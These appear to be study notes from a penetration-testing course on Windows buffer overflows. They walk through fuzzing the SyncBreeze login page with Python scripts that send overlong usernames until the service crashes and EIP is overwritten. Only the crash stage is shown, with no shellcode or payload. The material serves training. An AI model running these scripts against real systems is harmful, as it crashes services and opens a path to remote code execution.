# Windows Buffer Overflows
We will be discovering and exploiting a vulnerability in the SyncBreeze application. The process consists of several steps. First, the vulnerability in the code must be discovered - in  this situation, we do not have access to the source code. Second, we will have to create our input in a way so that we gain control of the critical CPU registers. Finally, we need to manipulate the memory to gain reliable remote code execution.

# Discovering the Vulnerability
Generally speaking, there are three primary techniques for identifying flaws in applications.
1. Source code review - this is the easiest, but requires access to the source code
2. Reverse engineering techniques
3. Fuzzing

The goal of fuzzing is to provide the target application with input that is incorrectly handled, resulting in the application crashing. The input is programmatically generated to be malformed, and if a crash occurs due to this malformed data, it may be indicative of a potential vulnerability such as buffer overflow.

## Fuzzing the HTTP protocol
The Windows 10 Lab Machine is able to run our SyncBreeze service by going to *services.msc* > right-click SyncBreeze > *Start*.

The SyncBreeze vulnerability lies in the login page, but since we do not know of this vulnerability, we would begin fuzzing every input field offered by the application, looking for any crashes caused by our input.

In order to begin fuzzing our input, we first need to sample the network traffic passing from the client and server for us to use as our input data/seed.

We launch *Wireshark* on our Kali machine and monitor port 80 as we attempt to log in to SyncBreeze. We can identify the three-way handshake followed by our HTTP traffic.

```
POST /login HTTP/1.1
Host: 10.11.0.22
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.0.22/login
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=AAAA&password=BBBBHTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 730

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/h
<html>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
<meta name='Author' content='Flexense HTTP Server v10.0.28'>
<meta name='GENERATOR' content='Flexense HTTP v10.0.28'>
<title>Sync Breeze Enterprise @ DESKTOP-4MK82OB - Error</title>
<link rel='stylesheet' type='text/css' href='resources/syncbreeze.css' media='all'>
</head>
<body>
<center>
<div class='error_message' style='margin-top: 200px;'>
<p>The specified user name and/or password is incorrect.</p>
</div>
<input style='margin-top: 20px;' type='button' value='Close' onClick="history.go(-1);"
</center>
</body>
</html>
```

Using this, we can begin building our fuzzer with a Python POC script.
```python
#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."

    size = 100
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.210.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.210.10", 80))
    s.send(buffer)
    
    s.close()

    print "\nDone!"
    
except:
    print "Could not connect!"
```

Since we are trying to find the buffer overflow vulnerability, we build our generation-based fuzzer such that it will send multiple HTTP POST requests with increasing longer usernames.
```python
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()
```

Before we can run our fuzzer, we need to attach the debugger to the SyncBreeze process that is listening on TCP port 80. We will use *Microsoft TCPView* for this (uncheck "Resolve Addresses").
![[Pasted image 20221226233625.png]]

Once we have attached the debugger, the application is paused so we will need to resume it by pressing F9.

We can see that once the username reaches 800 bytes in length, we obtain an access violation with EIP at 41414141.






***
# Topical Exercises

1.  Build the fuzzer and replicate the SyncBreeze crash.
	1. ![[Pasted image 20221227000624.png]]
2.  Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?